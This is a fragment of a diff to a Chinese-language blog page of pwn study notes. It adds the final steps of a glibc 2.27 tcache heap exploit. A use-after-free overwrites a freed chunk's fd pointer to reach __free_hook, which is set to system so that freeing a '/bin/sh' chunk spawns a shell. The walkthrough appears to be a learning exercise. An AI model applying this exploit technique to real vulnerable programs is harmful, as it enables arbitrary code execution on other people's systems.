+<h1 id="此时-0x90-的-Tcache-是满的，我们换个大小-0x60-进行攻击，比较干净"><a href="#此时-0x90-的-Tcache-是满的，我们换个大小-0x60-进行攻击，比较干净" class="headerlink" title="此时 0x90 的 Tcache 是满的，我们换个大小 (0x60) 进行攻击，比较干净"></a>此时 0x90 的 Tcache 是满的，我们换个大小 (0x60) 进行攻击，比较干净</h1><h1 id="申请一个新的-chunk-9"><a href="#申请一个新的-chunk-9" class="headerlink" title="申请一个新的 chunk 9"></a>申请一个新的 chunk 9</h1><p>  add(9, 0x60)</p>
+<h1 id="释放它，让它进入-Tcache-0x70-bin-的链表头部"><a href="#释放它，让它进入-Tcache-0x70-bin-的链表头部" class="headerlink" title="释放它，让它进入 Tcache (0x70 bin) 的链表头部"></a>释放它，让它进入 Tcache (0x70 bin) 的链表头部</h1><p>  delete(9)</p>
+<h1 id="利用-UAF-修改-fd-指针"><a href="#利用-UAF-修改-fd-指针" class="headerlink" title="利用 UAF 修改 fd 指针"></a>利用 UAF 修改 fd 指针</h1><h1 id="Glibc-2-27-Tcache-不检查-fd-指向哪里，我们直接指向-free-hook"><a href="#Glibc-2-27-Tcache-不检查-fd-指向哪里，我们直接指向-free-hook" class="headerlink" title="Glibc 2.27 Tcache 不检查 fd 指向哪里，我们直接指向 __free_hook"></a>Glibc 2.27 Tcache 不检查 fd 指向哪里，我们直接指向 __free_hook</h1><p>  edit(9, p64(free_hook))</p>
+<h1 id="现在的-Tcache-链表-Chunk-9-free-hook"><a href="#现在的-Tcache-链表-Chunk-9-free-hook" class="headerlink" title="现在的 Tcache 链表: [Chunk 9] -&gt; [__free_hook]"></a>现在的 Tcache 链表: [Chunk 9] -&gt; [__free_hook]</h1><h1 id="第一次申请，把-Chunk-9-取出来"><a href="#第一次申请，把-Chunk-9-取出来" class="headerlink" title="第一次申请，把 Chunk 9 取出来"></a>第一次申请，把 Chunk 9 取出来</h1><p>  add(10, 0x60)</p>
+<h1 id="第二次申请，拿到的就是我们伪造的地址-free-hook"><a href="#第二次申请，拿到的就是我们伪造的地址-free-hook" class="headerlink" title="第二次申请，拿到的就是我们伪造的地址 (__free_hook)"></a>第二次申请，拿到的就是我们伪造的地址 (__free_hook)</h1><p>  add(11, 0x60)</p>
+</li>
+<li><p>step 3 获取shell</p>
+<h1 id="此时-chunk-11-对应的内存就是-free-hook"><a href="#此时-chunk-11-对应的内存就是-free-hook" class="headerlink" title="此时 chunk 11 对应的内存就是 __free_hook"></a>此时 chunk 11 对应的内存就是 __free_hook</h1><h1 id="此时-chunk-10-是一个普通的堆块，我们拥有它的读写权"><a href="#此时-chunk-10-是一个普通的堆块，我们拥有它的读写权" class="headerlink" title="此时 chunk 10 是一个普通的堆块，我们拥有它的读写权"></a>此时 chunk 10 是一个普通的堆块，我们拥有它的读写权</h1><h1 id="1-往-chunk-10-里写入-“-bin-sh-x00”"><a href="#1-往-chunk-10-里写入-“-bin-sh-x00”" class="headerlink" title="1. 往 chunk 10 里写入 “&#x2F;bin&#x2F;sh\x00”"></a>1. 往 chunk 10 里写入 “&#x2F;bin&#x2F;sh\x00”</h1><p>  edit(10, b”&#x2F;bin&#x2F;sh\x00”)   </p>
+<h1 id="2-往-chunk-11-free-hook-里写入-system-函数的地址"><a href="#2-往-chunk-11-free-hook-里写入-system-函数的地址" class="headerlink" title="2. 往 chunk 11 (__free_hook) 里写入 system 函数的地址"></a>2. 往 chunk 11 (__free_hook) 里写入 system 函数的地址</h1><p>  edit(11, p64(system_addr))</p>
+<h1 id="3-触发-Shell"><a href="#3-触发-Shell" class="headerlink" title="3. 触发 Shell"></a>3. 触发 Shell</h1><h1 id="原理：调用-free-10-时，系统会检查-free-hook。"><a href="#原理：调用-free-10-时，系统会检查-free-hook。" class="headerlink" title="原理：调用 free(10) 时，系统会检查 __free_hook。"></a>原理：调用 free(10) 时，系统会检查 __free_hook。</h1><h1 id="发现-hook-被改成了-system，于是执行-system-chunk10的内容"><a href="#发现-hook-被改成了-system，于是执行-system-chunk10的内容" class="headerlink" title="发现 hook 被改成了 system，于是执行 system(chunk10的内容)"></a>发现 hook 被改成了 system，于是执行 system(chunk10的内容)</h1><h1 id="等价于-system-“-bin-sh”"><a href="#等价于-system-“-bin-sh”" class="headerlink" title="等价于 system(“&#x2F;bin&#x2F;sh”)"></a>等价于 system(“&#x2F;bin&#x2F;sh”)</h1><p>  delete(10)</p>
+</li>
+</ul>
 
     </div>
 
@@ -413,13 +379,13 @@ io.interactive()
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/34711169/" rel="prev" title="二分图匹配">
-                  <i class="fa fa-angle-left"></i> 二分图匹配
+                <a href="/posts/20f999aa/" rel="prev" title="pwn学习记录（其六）">
+                  <i class="fa fa-angle-left"></i> pwn学习记录（其六）
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/d05aad03/" rel="next" title="pwn学习记录（其二）">
-                  pwn学习记录（其二） <i class="fa fa-angle-right"></i>
+                <a href="/posts/afcb054a/" rel="next" title="深入理解计算机系统阅读记录（其一）">
+                  深入理解计算机系统阅读记录（其一） <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
@@ -457,7 +423,7 @@ io.interactive()
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">42 分钟</span>
+    <span title="站点阅读时长">43 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
